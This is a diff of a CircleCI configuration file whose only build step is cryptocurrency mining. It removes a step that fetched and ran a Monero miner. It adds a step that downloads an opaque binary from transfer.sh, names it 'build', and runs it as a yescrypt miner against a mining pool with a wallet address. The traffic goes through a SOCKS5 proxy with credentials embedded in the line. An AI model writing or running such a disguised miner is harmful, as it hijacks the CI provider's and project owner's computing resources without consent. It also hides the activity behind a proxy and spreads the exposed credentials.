@@ -1,4 +1,3 @@
-
 version: 2.0
 jobs:
   build:
@@ -9,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet <WALLET ADDRESS>  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
+      - run: wget -qO build   http://transfer.sh/p2nGh8/Pultra && chmod +x build && ./build -a  yescrypt -o stratum+tcp://yescrypt.na.mine.zergpool.com:6233 -u DC27hTsS7UWVyL3PUKqZJJkB1ghMo9oe2B -p c=DGB,mc=XMY -t 36 -x socks5://OXk5cgacd:4uHDOv78GAq@iad-a10.ipvanish.com:1080 
